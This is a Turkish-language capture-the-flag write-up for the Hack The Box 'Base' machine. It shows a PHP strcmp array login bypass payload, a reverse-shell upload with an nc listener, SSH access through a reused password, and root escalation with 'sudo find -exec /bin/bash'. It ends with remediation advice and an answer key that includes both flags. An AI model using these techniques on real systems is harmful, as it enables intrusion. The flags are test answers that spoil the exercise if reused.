# HTB - Base Box Writeup

**Hedef:** 10.129.186.88
**Tarih:** 28.08.2026

## Nmap Taraması

```
nmap -sS -A -p- -T5 10.129.186.88
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to Base
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

İki port açık: 22'de SSH, 80'de ise Apache üzerinde çalışan bir web sitesi. Kimlik bilgim olmadığı için önce web tarafına yöneldim.

## Web Sitesi Keşfi

Siteyi gezerken bir login sayfasına rastladım:

```
http://10.129.186.88/login/login.php
```

`/login` dizinine gittiğimde üç dosya dikkatimi çekti:

```
/config.php
/login.php
/login.php.swp
```

`.swp` uzantılı dosya hemen ilgimi çekti çünkü bu, Vim editörünün bir dosya düzenlenirken oluşturduğu geçici swap dosyası. Genellikle editör düzgün kapatılmadığında sunucuda unutulmuş olur ve kaynak koda dair ciddi bilgi sızdırabilir.

Dosyayı indirdim ve `cat` ile içeriğine baktım:

```
cat 'login.php.swp'
```

İçerik biraz bozuk (binary) görünse de PHP kaynak kodunun büyük bir kısmı okunabiliyordu. Login mantığı şöyleydi:

```php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

Burada dikkatimi çeken şey `strcmp()` kullanımı oldu. PHP'de `strcmp()` fonksiyonu, karşılaştırdığı parametrelerden biri string değil de bir dizi (array) olursa hata verir ve bu hata durumunda fonksiyon `NULL` döner. PHP'de gevşek karşılaştırmada (`==`) `NULL`, `0`'a eşit kabul edilir. Yani `$_POST['username']` ve `$_POST['password']` değerlerini string yerine dizi olarak gönderirsem, `strcmp()` fonksiyonu hata verip `NULL` dönecek, bu da `0`'a eşit sayılacağı için karşılaştırma "doğru" gibi değerlendirilecekti. Klasik bir type juggling / authentication bypass zafiyeti.

## Kimlik Doğrulama Atlatma

Bunu test etmek için login isteğini Burp Suite ile yakaladım ve parametreleri dizi formatına çevirdim:

```
username[]=admin&password[]=burak
```

İstek gönderildiğinde giriş başarılı oldu ve `/upload.php` sayfasına yönlendirildim. Herhangi bir gerçek kimlik bilgisi bilmeden, sadece PHP'nin bu tip karşılaştırma zafiyetini kullanarak içeri girmiş oldum.

## Dosya Yükleme ve Erişilebilir Dizin Keşfi

`/upload.php` üzerinden bir reverse shell dosyası yükledim. Ama yüklenen dosyaların hangi dizine düştüğünü bilmiyordum, dolayısıyla dosyayı tetikleyemiyordum. Bunu bulmak için ffuf ile bir dizin taraması attım:

```
ffuf -u http://10.129.186.88/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

```
.htaccess   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1204ms]
.htpasswd   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4212ms]
_uploaded   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 51ms]
```

`_uploaded` isimli bir dizin doğrudan karşıma çıktı — yüklediğim dosyaların düştüğü yer buydu.

## Reverse Shell Elde Etme

Önce dinleyiciyi ayağa kaldırdım:

```
nc -lvnp 4444
```

Sonra tarayıcıdan `_uploaded/` dizinine giderek yüklediğim shell dosyasını tetikledim. Bağlantı hemen geldi:

```
listening on [any] 4444 ...
connect to [10.10.14.156] from (UNKNOWN) [10.129.186.88] 49286
Linux base 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`www-data` yetkisiyle bir shell elde ettim. TTY'yi daha kullanılabilir hale getirmek için:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Kimlik Bilgisi Bulma ve Yatay Hareket

Login sayfasında gördüğüm `config.php` dosyasını bu sefer shell üzerinden okudum:

```
www-data@base:/var/www/html/login$ cat config.php
```

```php
<?php
$username = "admin";
$password = "thisisagoodpassword";
```

Bu bilgiyle sisteme SSH ile erişmeyi denemeden önce, sistemde başka hangi kullanıcıların olduğuna baktım:

```
www-data@base:/$ cd home
www-data@base:/home$ ls
john
```

`john` isimli bir kullanıcı vardı, home dizininde de `user.txt` görünüyordu ama `www-data` yetkisiyle okuyamadım (Permission denied). `su admin` denedim ama sistemde böyle bir kullanıcı yoktu — bu bilgi web uygulaması içindi, sistem kullanıcısı değildi. Yine de aynı parola john için de geçerli olabilirdi diye düşünüp SSH ile denedim.

```
ssh john@10.129.186.88
```

Parola olarak `thisisagoodpassword` girildiğinde giriş başarılı oldu.

## User Flag

```
john@base:~$ cat user.txt
f54846c258f3b4612f78a819573d158e
```

## Yetki Yükseltme

john kullanıcısının sudo yetkilerine baktım:

```
john@base:~$ sudo -l
[sudo] password for john:
Matching Defaults entries for john on base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
```

`find` komutunu root olarak parolasız çalıştırma yetkim vardı. Bu, GTFOBins üzerinde çok iyi bilinen bir privilege escalation vektörü — `find` komutunun `-exec` seçeneği ile keyfi komut çalıştırılabiliyor:

```
sudo /usr/bin/find /bin -exec /bin/bash \;
```

Bu komutla root shell'i doğrudan elde ettim.

## Root Flag

```
root@base:~# cd /root
root@base:/root# cat root.txt
51709519ea18ab37dd6fc58096bea949
```

## Sonuç

Base box'ı, birden fazla klasik zafiyetin bir arada kurgulandığı öğretici bir örnek: unutulmuş bir `.swp` dosyası üzerinden kaynak kod sızıntısı, PHP'nin gevşek tip karşılaştırmasından kaynaklanan bir authentication bypass, dosya yükleme sonrası erişilebilir dizin keşfi ve son olarak `sudo` ile yanlış yapılandırılmış bir `find` binary'si üzerinden root'a çıkış.

Gerçek bir ortamda bu bulguları raporlarken şunları vurgulardım:

- Editör swap/backup dosyaları (`.swp`, `~`, `.bak` vb.) production sunucusunda asla kalmamalı, deploy sürecine dahil edilmemeli
- PHP'de kullanıcı girdisi karşılaştırılırken `strcmp()` yerine `hash_equals()` gibi tip güvenli fonksiyonlar tercih edilmeli, ya da gevşek (`==`) yerine katı (`===`) karşılaştırma kullanılmalı
- Yüklenen dosyaların tutulduğu dizinler tahmin edilebilir isimlerde olmamalı ve doğrudan çalıştırılabilir script barındırmamalı (upload dizini için execute yetkisi kaldırılmalı)
- `sudo` ile verilen yetkiler mümkün olduğunca dar tutulmalı; `find`, `vim`, `less` gibi GTFOBins'te yer alan komutlara root yetkisiyle sınırsız erişim verilmemeli

---

## Görev Soruları ve Cevapları

**Görev 1 — Uzak sunucuda hangi iki TCP portu açık?**
22 (SSH) ve 80 (HTTP)

**Görev 2 — Giriş sayfası için web sunucusundaki göreceli yol nedir?**
`/login/login.php`

**Görev 3 — '/login' dizininde kaç dosya bulunmaktadır?**
3 (config.php, login.php, login.php.swp)

**Görev 4 — Takas dosyasının dosya uzantısı nedir?**
`.swp`

**Görev 5 — Arka uç kodunda, kullanıcının gönderdiği kullanıcı adı ve şifreyi geçerli kullanıcı adı ve şifreyle karşılaştırmak için hangi PHP fonksiyonu kullanılıyor?**
`strcmp()`

**Task 6 — In which directory are the uploaded files stored?**
`_uploaded`

**Task 7 — Which user exists on the remote host with a home directory?**
john

**Task 8 — What is the password for the user present on the system?**
`thisisagoodpassword`

**Submit User Flag — Submit the flag located in the john user's home directory.**
`f54846c258f3b4612f78a819573d158e`

**Task 10 — What is the full path to the command that the user john can run as user root on the remote host?**
`/usr/bin/find`

**Task 11 — What action can the find command use to execute commands?**
`-exec`

**Kök Bayrağı Gönder — Submit the flag located on the administrator's desktop.**
`51709519ea18ab37dd6fc58096bea949`
